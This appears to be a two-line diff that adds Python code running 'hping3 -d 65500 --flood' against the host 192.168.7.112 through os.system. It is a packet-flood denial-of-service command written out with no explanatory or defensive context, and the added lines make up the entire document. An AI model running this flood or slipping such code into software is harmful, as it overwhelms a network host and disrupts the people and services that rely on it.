@@ -1,0 +1,2 @@
+import os
+os.system("hping3 -d 65500 --flood 192.168.7.112")
